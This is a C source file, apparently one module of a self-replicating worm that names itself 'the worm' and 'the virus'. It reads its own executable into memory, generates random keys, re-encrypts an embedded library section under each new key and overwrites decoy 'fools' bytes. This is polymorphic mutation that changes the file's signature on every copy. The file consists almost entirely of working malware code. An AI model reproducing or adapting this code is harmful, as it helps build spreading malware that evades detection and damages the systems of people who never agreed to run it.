#include "utils.h"



// load the bytes of the currently executed file (the worm) into memory for mutating and copying it later
void load_file_bytes(Globals *global){
    FILE *fileptr;

    size_t *filesize = &global->malware_size;
    char **buffer = &global->malware_copy;

    fileptr = global->fopen(global->malware_path, "rb");  // Open the file in binary mode
    ASSERT(fileptr, "fread");
    global->fseek(fileptr, 0, SEEK_END);      // Jump to the end of the file
    *filesize = global->ftell(fileptr);       // Get the current byte offset in the file
    global->rewind(fileptr);                  // Jump back to the beginning of the file

    *buffer = (char *)global->malloc(*filesize * sizeof(char)); // Enough memory for the file
    ASSERT(*buffer, "malloc");
    global->fread(*buffer, *filesize, 1, fileptr); // Read in the entire file
    global->fclose(fileptr); // Close the file
}

// generate a new key from 8 random bytes (!= 0x00)
uint64_t generate_key(Globals *global){
    uint64_t key = 0;
    int i=0;
    while(i < 8){
        int r = global->rand();
        char c = *(char *)&r;
        if(c != 0){
            ((char *)&key)[i] = c;
            i++;
        }
    }
    return key;
}

void mutate_fools(Globals *global){
    for(int i=0; i<global->lib->n_fools_offsets; i++){
        uint64_t offset = global->lib->fools_offsets[i];

        // write new random bytes to fools entry
        *(uint64_t *)(global->malware_copy + offset) = generate_key(global);
    }
}

void mutate_lib(Globals* global){
    DEBUG_LOG("Mutate the virus!\n");
    MaLib *lib = global->lib;
    uint64_t key = generate_key(global);
    char *file_buffer = global->malware_copy;
    DEBUG_LOG("New Key: 0x%lx\n", key);
    DEBUG_LOG("🎲Change key from (%lx) --to--> ", *(uint64_t *)(file_buffer+lib->elf_offset_key));
    
    // copy the unencrypted data
    global->memcpy((void *)(file_buffer+lib->elf_offset_data), global->lib_mem, lib->data_length);
    
    // encrypt the data with the new key
    global->encrypt_layered((void *)(file_buffer+lib->elf_offset_data), lib->data_length, (char*)&key);
    
    // write the new key to the new file
    *(uint64_t *)(file_buffer+lib->elf_offset_key) = key;
    DEBUG_LOG("(%lx)🎲\n", *(uint64_t *)(file_buffer+lib->elf_offset_key));

    // mutate fool_ls entries
    mutate_fools(global);
}

